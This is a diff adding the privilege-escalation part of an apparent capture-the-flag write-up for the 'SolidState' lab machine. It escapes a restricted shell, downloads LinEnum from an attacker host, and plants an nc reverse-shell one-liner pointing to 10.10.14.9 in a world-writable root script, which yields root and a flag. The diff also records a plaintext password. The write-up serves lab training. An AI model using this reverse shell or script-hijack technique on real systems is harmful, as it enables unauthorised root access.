@@ -127,9 +127,42 @@ mindy@solidstate:~$ cat user.txt
 ========================Priv Escalation========================================
 I needed to break from rbash jail and so:
 └─# ssh mindy@10.10.10.51 -t 'bash --noprofile'
-mindy@10.10.10.51's password: 
+mindy@10.10.10.51's password:P@55W0rd1!2@
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
 mindy
+wget http://10.10.14.9/LinEnum.sh
+chmod +x LinEnum.sh
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./LinEnum.sh -t
+[-] World-writable files (excluding /proc and /sys):
+-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('rm -r /tmp/* ')
+except:
+     sys.exit()
+Drop a reverse shell here and execute as root
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py 
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 1234 >/tmp/f ')
+except:
+     sys.exit()
+
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ /bin/bash python tmp.py 
+/usr/bin/python: /usr/bin/python: cannot execute binary file
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+4f4afb55463c3bc79ab1e906b074953
+And voila! root user spawned!
 
 Reference
 A guide to exploit James server : https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html
